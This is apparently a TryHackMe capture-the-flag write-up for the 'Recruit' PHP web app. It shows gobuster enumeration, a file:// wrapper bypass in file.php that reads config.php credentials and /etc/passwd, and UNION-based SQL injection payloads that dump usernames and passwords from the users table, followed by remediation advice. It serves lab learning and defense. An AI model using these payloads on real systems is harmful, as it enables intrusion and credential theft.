# Recruit — TryHackMe Writeup

**Difficulty:** Intermediate
**Category:** Webhacking, SQLi


---

## Summary

This box is a PHP web application that chains together three issues into full account access and credential disclosure:

1. **Authenticated file read** via `file.php?cv=` with a weak "local files only" filter, bypassed using the `file://` wrapper to read application source (including DB credentials in `config.php`).
2. **Login** to the user dashboard using the recovered credentials.
3. **UNION-based SQL injection** in the post-login search feature, used to dump credentials from the database.

---

## Reconnaissance

### Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

Results:

```
.htaccess.php        (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
.htpasswd.php        (Status: 403) [Size: 279]
api.php              (Status: 200) [Size: 4151]
assets               (Status: 301) [Size: 317] [--> /assets/]
config.php           (Status: 200) [Size: 0]
dashboard.php        (Status: 302) [Size: 457] [--> index.php]
file.php             (Status: 200) [Size: 20]
footer.php           (Status: 200) [Size: 289]
header.php           (Status: 200) [Size: 457]
index.php            (Status: 200) [Size: 1417]
javascript           (Status: 301) [Size: 321] [--> /javascript/]
logout.php           (Status: 302) [Size: 0] [--> index.php]
mail                 (Status: 301) [Size: 315] [--> /mail/]
phpmyadmin           (Status: 301) [Size: 321] [--> /phpmyadmin/]
server-status        (Status: 403) [Size: 279]
sitemap.xml          (Status: 200) [Size: 1710]
```

### Triage

| Endpoint | Notes |
|---|---|
| `index.php` | Login page |
| `dashboard.php` | Redirects to `index.php` → authenticated area, our goal |
| `file.php` | Takes a `cv` parameter → file-read primitive |
| `config.php` | 0 bytes (no output) but source likely holds DB creds |
| `api.php` | Substantial response; documents app behaviour |
| `phpmyadmin/` | DB admin panel — useful once we have creds |
| `mail/` | Possible webmail / secondary surface |
| `sitemap.xml` | Worth reading for extra endpoints |

The `.ht*` and `server-status` 403s are default Apache responses and were ignored.

---

## Exploitation

### Step 1 — File read via `file.php?cv=`

The `cv` parameter accepts a file path. Naive input returns:

```
only local files allowed
```

This is a scheme/format filter intended to block remote file inclusion. Supplying the `file://` wrapper gets past it but hits a second restriction:

```
file.php?cv=file:///etc/passwd
→ access denied
```

The error change (`only local files allowed` → `access denied`) confirms a **two-stage filter**: the first stage validates the scheme, the second enforces a path/directory restriction.

Because the endpoint serves the CV file with `readfile()` / `file_get_contents()` (it returns content rather than executing it), pointing `file://` at a `.php` file returns its **raw source** instead of executed output. This lets us read application source within the allowed path:

```
file.php?cv=file:///var/www/html/config.php
```

```php
[...]
$hr_pass = "<HR_PASS>";
[...]
```

### Step 2 — Login

Using the credentials recovered from source and guessing the username ("HR"), authenticate at `index.php` and reach `dashboard.php`.
First Flag was aquired after login.

### Step 3 — UNION-based SQL injection

The dashboard exposes a search feature. A single quote triggers a SQL error, confirming injection (MySQL/MariaDB, consistent with the phpMyAdmin install).

**Find the column count:**
was conveniently printed out as a Table.

**Identify printed columns:**

```sql
' AND 1=0 UNION SELECT 1,2,3,4-- -
```


**Fingerprint:**

```sql
' AND 1=0 UNION SELECT 1,@@version,database(),4-- -
```

**Enumerate tables and columns:**

```sql
' AND 1=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -

' AND 1=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
```

**Dump credentials:**

```sql
' AND 1=0 UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users-- -
```
The Admin Flag was acquired after logging in as Admin with the found credentials

## Remediation

- **`file.php`** — Don't accept arbitrary paths. Validate against a strict allowlist of known files, reject wrappers (`file://`, `php://`, etc.), and resolve `realpath()` against a fixed base directory.
- **SQL injection** — Use parameterized queries / prepared statements; never concatenate user input into SQL.
- **Credentials in source** — Keep secrets out of web-served files; restrict DB accounts to least privilege; don't reuse DB passwords for application logins.
- **Exposed panels** — Restrict `phpmyadmin/` to trusted hosts or place it behind authentication / a VPN.

---

## Tools Used
- `gobuster`
- `curl` / browser inspect tool